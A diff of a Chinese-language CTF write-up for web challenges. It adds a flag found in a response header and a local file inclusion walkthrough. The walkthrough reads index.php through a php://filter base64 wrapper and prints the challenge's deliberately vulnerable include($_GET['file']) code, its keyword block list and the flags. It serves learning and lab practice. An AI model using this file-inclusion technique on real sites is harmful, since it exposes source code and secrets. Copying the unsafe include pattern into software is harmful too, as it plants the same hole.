@@ -1,17 +1,20 @@
 # Web
-
-*	[AAencode (100)](#AAencode)
-*	[php decode (100)](#php_decode)
-*	[簽到 2 (50)](#簽到2)
-*	[這題不是 Web (100)](#這題不是Web)
-*	[單身二十年 (100)](#單身二十年)
-*	[你從哪裡來 (100)](#你從哪裡來)
-*	[層層地進 (100)](#層層地進)
-*	[單身一百年也沒用 (150)](#單身一百年也沒用)
-*	[Download~! (200)](#Download~!)
-*	[md5 collision (50)](#md5_collision)
-*	[COOKIE (200)](#COOKIE)
-*	[MYSQL (200)](#MYSQL)
+* 自己解
+	*	[AAencode (100)](#AAencode)
+	*	[php decode (100)](#php_decode)
+	*	[簽到 2 (50)](#簽到2)
+	*	[這題不是 Web (100)](#這題不是Web)
+	*	[單身二十年 (100)](#單身二十年)
+	*	[你從哪裡來 (100)](#你從哪裡來)
+	*	[層層地進 (100)](#層層地進)
+	*	[單身一百年也沒用 (150)](#單身一百年也沒用)
+	*	[Download~! (200)](#Download~!)
+	*	[md5 collision (50)](#md5_collision)
+	*	[COOKIE (200)](#COOKIE)
+	*	[MYSQL (200)](#MYSQL)
+	*	[Header (250)](#Header)	
+* 看別人的 writeup 學
+	*	[文件包含 (150)](#文件包含)	
 
 
 <h2 id="AAencode">AAencode (100)</h2>
@@ -355,3 +358,62 @@ http://chinalover.sinaapp.com/web11/sql.php?id=1024.5
 ```
 
 `the flag is:nctf{query_in_mysql}`
+
+<h2 id="Header">Header (250)</h2>
+
+藏在 Response Header 裡面
+
+`nctf{tips_often_hide_here}`
+
+<h2 id="文件包含">Web - 文件包含 (150)</h2>
+
+題目 http://4.chinalover.sinaapp.com/web7/index.php
+
+只有一個超連結 `click me? no` 點進去後 url 變成
+
+```
+http://4.chinalover.sinaapp.com/web7/index.php?file=show.php
+```
+
+[php:// 介紹](http://php.net/manual/zh/wrappers.php.php)
+
+[漏洞用法](http://www.cnseay.com/2356/comment-page-1/)
+
+範例
+
+```
+http://127.0.0.1:81/test.php?file=php://filter/convert.base64-encode/resource=config.php
+```
+
+把 `php://filter/convert.base64-encode/resource=` 加進題目的 url 中
+
+```
+http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php
+```
+
+得到
+
+```
+PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=
+```
+
+base64 decode
+
+```
+<html>
+    <title>asdf</title>
+    
+<?php
+	error_reporting(0);
+	if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}
+	$file=$_GET['file'];
+	if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
+		echo "Oh no!";
+		exit();
+	}
+	include($file); 
+//flag:nctf{edulcni_elif_lacol_si_siht}
+
+?>
+</html>
+```
